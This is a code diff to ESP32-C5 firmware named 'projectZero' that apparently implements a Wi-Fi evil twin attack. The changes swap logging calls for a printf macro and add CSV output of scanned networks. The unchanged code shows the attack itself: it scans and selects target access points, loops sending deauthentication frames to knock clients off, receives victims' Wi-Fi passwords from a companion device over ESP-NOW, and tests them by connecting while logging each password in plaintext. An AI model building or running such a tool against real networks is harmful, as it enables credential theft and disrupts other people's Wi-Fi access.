@@ -32,6 +32,8 @@
 #define LED_COUNT          1
 #define RMT_RES_HZ         (10 * 1000 * 1000)  // 10 MHz
 
+#define MY_LOG_INFO(tag, fmt, ...) printf("[INFO] " fmt "\n", ##__VA_ARGS__)
+
 
 
 static const char *TAG = "projectZero";
@@ -121,13 +123,13 @@ static void wifi_event_handler(void *event_handler_arg,
             ESP_LOGD(TAG, "Wi-Fi: connected to SSID='%s', channel=%d, bssid=%02X:%02X:%02X:%02X:%02X:%02X",
                      (const char*)e->ssid, e->channel,
                      e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
-            ESP_LOGI(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
+            MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
             applicationState = IDLE;
             break;
         }
         case WIFI_EVENT_SCAN_DONE: {
             const wifi_event_sta_scan_done_t *e = (const wifi_event_sta_scan_done_t *)event_data;
-            ESP_LOGI(TAG, "Wi-Fi: finnished scan. Detected APs=%u, status=%u", e->number, e->status);
+            MY_LOG_INFO(TAG, "WiFi scan delay completed.");
             applicationState = IDLE;
             break;
         }
@@ -170,10 +172,10 @@ static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *
         ESP_LOGW(TAG,"Malloc error 4 password");
     }
 
-    ESP_LOGI(TAG, "Received from: %02X:%02X:%02X:%02X:%02X:%02X",
+    MY_LOG_INFO(TAG, "Received from: %02X:%02X:%02X:%02X:%02X:%02X",
              recv_info->src_addr[0], recv_info->src_addr[1], recv_info->src_addr[2],
              recv_info->src_addr[3], recv_info->src_addr[4], recv_info->src_addr[5]);
-    ESP_LOGI(TAG, "Message: %s", msg);
+    MY_LOG_INFO(TAG, "Message: %s", msg);
 
     //Now, let's check if it's a password for Evil Twin:
     applicationState = EVIL_TWIN_PASS_CHECK;
@@ -186,9 +188,9 @@ static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *
     sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
     esp_wifi_set_config(WIFI_IF_STA, &sta_config);
     vTaskDelay(pdMS_TO_TICKS(2000));
-    ESP_LOGI(TAG, "Received connect command from ESP32 to SSID='%s' with password='%s'", evilTwinSSID, msg);
+    MY_LOG_INFO(TAG, "Received connect command from ESP32 to SSID='%s' with password='%s'", evilTwinSSID, msg);
     connectAttemptCount = 0;
-    ESP_LOGI(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
+    MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
     esp_wifi_connect();
 
     //this would be blocking!
@@ -206,7 +208,7 @@ static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *
 
 static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status) {
     const uint8_t *mac_addr = send_info->des_addr;
-    ESP_LOGI(TAG, "Sent to %02X:%02X:%02X:%02X:%02X:%02X, status: %s",
+    MY_LOG_INFO(TAG, "Sent to %02X:%02X:%02X:%02X:%02X:%02X, status: %s",
              mac_addr[0], mac_addr[1], mac_addr[2],
              mac_addr[3], mac_addr[4], mac_addr[5],
              status == ESP_NOW_SEND_SUCCESS ? "OK" : "ERROR");
@@ -251,7 +253,7 @@ static esp_err_t wifi_init_ap_sta(void) {
     esp_err_t ret = esp_wifi_get_mac(WIFI_IF_STA, mac);
 
     if (ret == ESP_OK) {
-        ESP_LOGI("MAC", "MAC Address: %02X:%02X:%02X:%02X:%02X:%02X",
+        MY_LOG_INFO("MAC", "MAC Address: %02X:%02X:%02X:%02X:%02X:%02X",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
     } else {
         ESP_LOGE("MAC", "Failed to get MAC address");
@@ -278,7 +280,7 @@ static esp_err_t espnow_init(void) {
         ESP_LOGE(TAG, "Failed to add peer");
     }
     return ESP_OK;
-    ESP_LOGI(TAG, "Peer added");
+    MY_LOG_INFO(TAG, "Peer added");
 }
 
 // --- Auxiliary: scan and print ---
@@ -292,29 +294,75 @@ static esp_err_t do_scan_and_store(void) {
         .scan_time.active.min = 100,
         .scan_time.active.max = 300,
     };
-    ESP_LOGI(TAG, "About to start scan...");
+    MY_LOG_INFO(TAG, "USB Command Received: scan");
     ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_cfg, true)); // blokujace
 
     g_scan_count = MAX_AP_CNT;
     ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&g_scan_count, g_scan_results));
 
-    uint16_t total = 0;
-    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&total));
-    ESP_LOGI(TAG, "Found %u APs.", g_scan_count);
-
+    //uint16_t total = 0;
+    //ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&total));
+    //MY_LOG_INFO(TAG, "Found %u APs.", g_scan_count);
     return ESP_OK;
 }
 
+static void escape_csv_field(const char* input, char* output, size_t output_size) {
+    if (!input || !output || output_size < 2) return;
+    
+    size_t input_len = strlen(input);
+    size_t out_pos = 0;
+    
+    for (size_t i = 0; i < input_len && out_pos < output_size - 2; i++) {
+        if (input[i] == '"') {
+            if (out_pos < output_size - 3) {
+                output[out_pos++] = '"';
+                output[out_pos++] = '"';
+            }
+        } else {
+            output[out_pos++] = input[i];
+        }
+    }
+    output[out_pos] = '\0';
+}
+
+static void print_network_csv(int index, const wifi_ap_record_t* ap) {
+    char escaped_ssid[64];
+    escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
+    
+    MY_LOG_INFO(TAG, "\"%d\",\"%s\",\"%02X:%02X:%02X:%02X:%02X:%02X\",\"%d\",\"%d\",\"%s\"",
+                (index + 1),
+                escaped_ssid,
+                ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                ap->bssid[3], ap->bssid[4], ap->bssid[5],
+                ap->primary,
+                ap->rssi,
+                ap->primary <= 14 ? "2.4GHz" : "5GHz");
+}
+
+
+
 static void print_scan_results(void) {
-    ESP_LOGI(TAG,"Index  RSSI  Auth  Channel  BSSID              SSID");
+    //MY_LOG_INFO(TAG,"Index  RSSI  Auth  Channel  BSSID              SSID");
     for (int i = 0; i < g_scan_count; ++i) {
         wifi_ap_record_t *ap = &g_scan_results[i];
-        ESP_LOGI(TAG,"%5d  %4d  %4d  %5d  %02X:%02X:%02X:%02X:%02X:%02X  %s",
-               i, ap->rssi, ap->authmode, ap->primary,
-               ap->bssid[0], ap->bssid[1], ap->bssid[2],
-               ap->bssid[3], ap->bssid[4], ap->bssid[5],
-               (const char*)ap->ssid);
+        // MY_LOG_INFO(TAG,"%5d  %4d  %4d  %5d  %02X:%02X:%02X:%02X:%02X:%02X  %s",
+        //        i, ap->rssi, ap->authmode, ap->primary,
+        //        ap->bssid[0], ap->bssid[1], ap->bssid[2],
+        //        ap->bssid[3], ap->bssid[4], ap->bssid[5],
+        //        (const char*)ap->ssid);
+        // MY_LOG_INFO(TAG, "%-6d %-16s %02X:%02X:%02X:%02X:%02X:%02X   %-2d   %-4d   %s",
+        //     (i+1),
+        //     (const char*)ap->ssid,
+        //     ap->bssid[0], ap->bssid[1], ap->bssid[2],
+        //     ap->bssid[3], ap->bssid[4], ap->bssid[5],
+        //     ap->primary,
+        //     ap->rssi,
+        //     ap->primary <= 14 ? "2.4GHz" : "5GHz");
+
+        print_network_csv(i, ap);
+
     }
+    MY_LOG_INFO(TAG, "Scan results printed.");
 }
 
 // --- CLI: commands ---
@@ -361,7 +409,7 @@ static int cmd_select_networks(int argc, char **argv) {
         len += snprintf(buf + len, sizeof(buf) - len, "%s%s", selectedSSID, (i + 1 == g_selected_count) ? "" : ",");
     }
 
-    ESP_LOGI(TAG, "%s", buf);
+    MY_LOG_INFO(TAG, "%s", buf);
 
 
     return 0;
@@ -398,11 +446,11 @@ static int cmd_start_evil_twin(int argc, char **argv) {
         vTaskDelay(pdMS_TO_TICKS(100));
         ESP_ERROR_CHECK(esp_now_send(esp32_mac, (uint8_t *)msg, strlen(msg)));
 
-        ESP_LOGI(TAG,"Evil twin: %s", evilTwinSSID);
+        MY_LOG_INFO(TAG,"Evil twin: %s", evilTwinSSID);
         for (int i = 0; i < g_selected_count; ++i) {
             int idx = g_selected_indices[i];
             wifi_ap_record_t *ap = &g_scan_results[idx];
-            ESP_LOGI(TAG,"  [%d] SSID='%s' RSSI=%d Auth=%d", idx, (const char*)ap->ssid, ap->rssi, ap->authmode);
+            MY_LOG_INFO(TAG,"  [%d] SSID='%s' RSSI=%d Auth=%d", idx, (const char*)ap->ssid, ap->rssi, ap->authmode);
         }
         //Main loop of deauth frames sending:
         while ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK)) {
@@ -416,9 +464,9 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             }
             vTaskDelay(pdMS_TO_TICKS(100));
         }
-        ESP_LOGI(TAG,"Evil twin: finished attack. Reboot your board.");
+        MY_LOG_INFO(TAG,"Evil twin: finished attack. Reboot your board.");
     } else {
-        ESP_LOGI(TAG,"Evl twin: no selected APs (use select_networks).");
+        MY_LOG_INFO(TAG,"Evl twin: no selected APs (use select_networks).");
     }
     return 0;
 }
@@ -426,7 +474,7 @@ static int cmd_start_evil_twin(int argc, char **argv) {
 static int cmd_reboot(int argc, char **argv)
 {
     (void)argc; (void)argv;
-    ESP_LOGI(TAG,"Restart...");
+    MY_LOG_INFO(TAG,"Restart...");
     vTaskDelay(pdMS_TO_TICKS(100));
     esp_restart();
     return 0;
@@ -443,7 +491,7 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&scan_cmd));
-    //ESP_LOGI(TAG, "Zarejestrowano komende: %s", scan_cmd.command);
+    //MY_LOG_INFO(TAG, "Zarejestrowano komende: %s", scan_cmd.command);
 
     const esp_console_cmd_t select_cmd = {
         .command = "select_networks",
@@ -484,7 +532,7 @@ void app_main(void) {
     // esp_log_level_set("espnow", ESP_LOG_DEBUG);
 
 
-    ESP_LOGI(TAG, "Application starts (ESP32-C5)");
+    //MY_LOG_INFO(TAG, "Application starts (ESP32-C5)");
 
     // 1. LED strip configuration
     led_strip_config_t strip_cfg = {
@@ -529,11 +577,11 @@ void app_main(void) {
     esp_console_repl_t *repl = NULL;
     esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
     
-    ESP_LOGI(TAG,"Available commands:");
-    ESP_LOGI(TAG,"  scan_networks");
-    ESP_LOGI(TAG,"  select_networks <indeks1> [indeks2] ...");
-    ESP_LOGI(TAG,"  start_evil_twin");
-    ESP_LOGI(TAG,"  reboot");
+    MY_LOG_INFO(TAG,"Available commands:");
+    MY_LOG_INFO(TAG,"  scan_networks");
+    MY_LOG_INFO(TAG,"  select_networks <indeks1> [indeks2] ...");
+    MY_LOG_INFO(TAG,"  start_evil_twin");
+    MY_LOG_INFO(TAG,"  reboot");
 
     repl_config.prompt = ">";
     repl_config.max_cmdline_length = 100;
@@ -555,9 +603,9 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
 
     //first, spend some time waiting for ESP-NOW signal that password has been provided which is expected on channel 1:
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-    ESP_LOGI(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
+    MY_LOG_INFO(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
     vTaskDelay(pdMS_TO_TICKS(300));
-    ESP_LOGI(TAG, "Finished waiting for ESP-NOW...");
+    MY_LOG_INFO(TAG, "Finished waiting for ESP-NOW...");
     //then, proceed with deauth frames on channels of the APs:
     for (int i = 0; i < g_selected_count; ++i) {
 
@@ -569,8 +617,8 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
             int idx = g_selected_indices[i];
             wifi_ap_record_t *ap_record = &g_scan_results[idx];
             ESP_LOGD(TAG, "Preparations to send deauth frame...");
-            ESP_LOGI(TAG, "Target SSID: %s", ap_record->ssid);
-            ESP_LOGI(TAG, "Target CHANNEL: %d", ap_record->primary);
+            MY_LOG_INFO(TAG, "Target SSID: %s", ap_record->ssid);
+            MY_LOG_INFO(TAG, "Target CHANNEL: %d", ap_record->primary);
             ESP_LOGD(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                     ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                     ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
